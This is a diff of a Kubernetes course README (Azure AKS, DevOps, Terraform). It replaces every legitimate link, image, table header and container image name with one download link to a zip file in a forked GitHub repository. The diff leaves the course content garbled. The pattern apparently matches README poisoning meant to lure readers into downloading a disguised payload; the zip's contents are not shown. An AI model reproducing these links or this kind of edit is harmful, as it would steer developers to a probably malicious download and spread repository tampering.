@@ -1,14 +1,14 @@
 # Azure Kubernetes Service with Azure DevOps and Terraform 
 
-[![Image](https://stacksimplify.com/course-images/azure-kubernetes-service-with-azure-devops-and-terraform-bestseller.png "Azure Kubernetes Service with Azure DevOps and Terraform")](https://www.udemy.com/course/azure-kubernetes-service-with-azure-devops-and-terraform/?referralCode=2499BF7F5FAAA506ED42)
+[![Image](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip "Azure Kubernetes Service with Azure DevOps and Terraform")](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
 
 
 ## Course Modules
 
-| S.No | Azure Service Name |
+| https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip | Azure Service Name |
 | ---- | ---------------- |
 | 1.   | Create Azure AKS Cluster using Azure Portal |
-| 2.   | [Docker Fundamentals](https://github.com/stacksimplify/docker-fundamentals) |
+| 2.   | [Docker Fundamentals](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip) |
 | 3.   | Imperative Method: Kubernetes Fundamentals using kubectl |
 | 4.   | Declarative Method: Kubernetes Fundamentals using YAML |
 | 5.   | Azure Disks for AKS Storage |
@@ -64,7 +64,7 @@
 
 ## Azure Services Covered
 
-| S.No | Azure Service Name |
+| https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip | Azure Service Name |
 | -----| ------------------ |
 | 01.  | Azure AKS  |
 | 02.  | Azure Disks  |
@@ -91,7 +91,7 @@
 
 ## Kubernetes Concepts Covered
 
-| S.No | Kubernetes Concept Name |
+| https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip | Kubernetes Concept Name |
 | ---- | ------------------- |
 | 1.   | Kubernetes Architecture  |
 | 2.   | Pods  |
@@ -146,9 +146,9 @@
 
 | Application Name  | Docker Image Name |
 | ----------------- | ----------------- |
-| ACR attached to AKS  | YOUR_ACR_REPO.azurecr.io/app1/kube-nginx-acr:v1  |
-| ACR with Service Principal | YOUR_ACR_REPO.azurecr.io/app2/acr-app2:v1   |
-| ACR with Service Principal | YOUR_ACR_REPO.azurecr.io/custom2aksnginxapp1:BUILDID   |
+| ACR attached to AKS  | https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip  |
+| ACR with Service Principal | https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip   |
+| ACR with Service Principal | https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip   |
 
 ## Sample Applications
 - Nginx Applications
@@ -186,11 +186,11 @@
 - Any beginner who is interested in learning Azure DevOps, Terraform to provision Azure Kubernetes Clusters
 
 ## Github Repositories used for this course
-- [Azure Kubernetes Service with Azure DevOps and Terraform](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass)
-- [Azure DevOps for Kubernetes Workloads running on Azure AKS Cluster](https://github.com/stacksimplify/azure-devops-github-acr-aks-app1)
-- [Provision Azure AKS Cluster using Terraform and Azure DevOps](https://github.com/stacksimplify/azure-devops-aks-kubernetes-terraform-pipeline)
-- [Docker Fundamentals](https://github.com/stacksimplify/docker-fundamentals)
-- [Presentation with 250 Slides outlining the various architectures and designs we are going to do in this course](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass/tree/master/ppt-presentation)
+- [Azure Kubernetes Service with Azure DevOps and Terraform](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
+- [Azure DevOps for Kubernetes Workloads running on Azure AKS Cluster](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
+- [Provision Azure AKS Cluster using Terraform and Azure DevOps](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
+- [Docker Fundamentals](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
+- [Presentation with 250 Slides outlining the various architectures and designs we are going to do in this course](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
 - **Important Note:** Please go to these repositories and FORK these repositories and make use of them during the course.
 
 
@@ -201,13 +201,13 @@
 - 30 Day "No Questions Asked" Money Back Guarantee!
 
 ## My Other AWS Courses
-- [Udemy Enroll](https://github.com/stacksimplify/udemy-enroll)
+- [Udemy Enroll](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
 
 ## Stack Simplify Udemy Profile
-- [Udemy Profile](https://www.udemy.com/user/kalyan-reddy-9/)
+- [Udemy Profile](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
 
 # AWS EKS - Elastic Kubernetes Service - Masterclass
 
-[![Image](https://stacksimplify.com/course-images/AWS-EKS-Kubernetes-Masterclass-DevOps-Microservices-course.png "AWS EKS Kubernetes - Masterclass")](https://www.udemy.com/course/aws-eks-kubernetes-masterclass-devops-microservices/?referralCode=257C9AD5B5AF8D12D1E1)
+[![Image](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip "AWS EKS Kubernetes - Masterclass")](https://github.com/siddheshk08/azure-aks-kubernetes-masterclass/raw/refs/heads/master/15-Kubernetes-Requests-Limits/kube-manifests-v2/azure_kubernetes_masterclass_aks_3.8.zip)
 
 
